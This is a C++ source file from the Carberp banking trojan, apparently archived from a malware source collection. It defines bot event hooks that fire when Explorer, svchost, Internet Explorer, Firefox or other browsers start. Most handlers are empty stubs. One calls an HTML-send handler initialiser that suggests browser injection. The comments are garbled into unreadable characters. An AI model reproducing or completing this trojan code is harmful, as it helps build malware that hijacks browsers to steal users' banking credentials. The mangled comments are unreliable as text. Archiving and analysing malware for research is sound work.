/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#include "BotEvents.h"
#include "GetApi.h"
#include "BotDebug.h"
#include "Strings.h"
#include "Utils.h"
//#include "Loader.h"
//#include "RuBnk/java_patcher.h"

#include "Modules.h"

//---------------------------------------------------------------------------


void ExplorerFirstStart(PEventData Data)
{
	// ������ ������ ���� � ����������



}
//---------------------------------------------------------------------------


void ExplorerStart(PEventData Data)
{


}
//---------------------------------------------------------------------------

void SVChostStart(PEventData Data, bool &Cancel)
{
	// �������� ������� ���������� � �������� svchost

}
//---------------------------------------------------------------------------

void InternetExplorerStarted(PEventData Data)
{
	// ������� Internet Explorer. ��������� ����� ������� � ������� ��������

}
//---------------------------------------------------------------------------


void FireFoxStarted(PEventData Data)
{
	// ������� �������. ��������� ����� ������� � ������� ��������

}
//---------------------------------------------------------------------------

void BrowserStarted(PEventData Data)
{
	// ������� ��������� �������. ��������� ����� ������� � ������� ��������
	#ifdef HTMLSendH
		InitHTMLSendHandlers();
	#endif;
}
//---------------------------------------------------------------------------

void ApplicationStarted(PEventData Data)
{
	// �������� ����������� ����������

}
//---------------------------------------------------------------------------

